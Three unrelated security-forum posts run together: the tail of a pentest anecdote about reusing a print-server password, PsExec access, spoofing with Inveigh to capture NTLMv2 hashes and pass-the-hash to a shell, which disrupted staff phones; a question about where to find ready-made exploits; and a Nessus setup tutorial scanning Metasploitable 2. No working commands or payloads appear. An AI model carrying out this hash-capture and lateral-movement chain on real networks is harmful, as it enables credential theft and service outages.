<p>Repeated same for all available ranges by guessing floor number based on floor i was on and I found a second PRINT-PC with exact same password.</p>
<p>I run PsExec againt the first device and by little snooping I find very sensitive information left on that device and an user account from old staff who used it. About 2GB of data had to be wiped properly after I reported the issue to the security staff.</p>
<p>After this I run Inveigh netbios spoofer to grab NTMLv2 hashes for PTH attack. As usual i get almost all hashes on all connected devices to my range with SMB open. Me always having bad luck, the script broadcasted my listen IP under the PBX used by the staff directly from their device and not external Cisco phone and after 5 minutes I hear some yelling that their phone ain’t working. <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<p>But still I managed to pass the hash on SMB to get CMD shell on one device for the lolz and had to hear yelling from IT department and the floor manager for about an hour but still was worth it.</p>
<p>Something looking very innocent like an windows box as print server with a weak password could easily become worst nightmare for an company because of accidentally left data and forgotten data that should’ve been deleted. Something out fun because actually a very serous threat to the organization, this almost never happened to me before.</p>
<p>All this was done with consent from Administrators and I had full permission.<br>
DO NOT ATTACK PEOPLE’S NETWORKS WITHOUT CONSENT PERIOD.</p>

            <p>Quick background example :<br>
You are playing in a time limited  CTF, or doing a pentest.<br>
You need a working exploit, and you don’t have time to write and test one yourself.<br>
Which site(s) do you get it from ?</p>
<p>Let me start by sharing the ones I use :</p>

            <p>Hello  everyone. Today I will write to you about " <strong>Nessus Vulnerability Scanner</strong> "</p>
<p>This is the first part of my wiriting about nessus  in this section I will talk about simple scans and setup</p>
<h3>Nessus Linux Installation</h3>
<p>You should first download the appropriate for your system.</p>
<p>You can view the packages in this;</p>
<p><strong><a href="https://www.tenable.com/products/nessus/select-your-operating-system" rel="noopener nofollow ugc">https://www.tenable.com/products/nessus/select-your-operating-system</a></strong></p>
<p>I downloaded the debian package.  Let’s go to setup <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p><strong>dpkg  -i Nessus-7.0.0-debian6_amd64.deb</strong></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b7ab88f58d69bbfdf8cd0d0e335370bec87b41f8.jpeg" alt="1" data-base62-sha1="qcOT7O5dOAcvCiEOVYYLYxQdo1y" width="690" height="387"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c5ce1749db5e89ead47c3666d1508852390b6b86.jpeg" alt="2" data-base62-sha1="sdRBN64JwT6OMAxJcnwxt4GDZ3M" width="690" height="387"></p>
<p>We got the activation code after opening Tenable membership. I then connected with the 8834 port scanner and entered the necessary information</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c7a0c4c6f328837aee331dd519cf332e85c53eb5.png" alt="3" data-base62-sha1="stZsDusUQC8vqwGojJRwgaJhmm1" width="690" height="387"></p>
<p>Meanwhile I downloaded the " <strong>metasploitable 2</strong> " virtual machine.  Then started broadcasting with VirtualBox</p>
<p>For a short time IP Address for vulnerability researcher<br>
Now right click on the new scan option.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8ac7b7aea8bfe2633a348a658d33fbbc3053ceea.png" alt="4" data-base62-sha1="jNHMAAkvIfO9WWGzTV89fYA4aAG" width="690" height="387"></p>
<p>We enter the target name and ip address bla.bla.bla.bla</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/51239064169882ad99f4867c5b4b2264c04140c6.png" alt="6" data-base62-sha1="bzMRYUcU2SYLcq9R2L2UDKYyBz8" width="690" height="387"></p>
<p>This part asks if you want to do the scanning at the widespread ports or not.<br>
We started scanning .</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b153bec9d51ef9aeb6c1308a7b6a516e35ec4759.png" alt="444" data-base62-sha1="piHW0K1RCdAbcHDwLT81nwxcw7T" width="690" height="387"></p>
<p>Continues to scan I will have a coffee <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Nessus gives  more healthier result than its competitors.</p>
<p>I am using nessus with remote server because  I do not have to wait for slow scans.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/808fd28da57f6ae39606c3f3922f29792cf4632f.png" alt="1212" data-base62-sha1="iljfM5KkXgqSSBG7MSTNEN0V1zp" width="690" height="387"></p>

<p>In the second part we will explain how to exploit these vulnerabilities.</p>
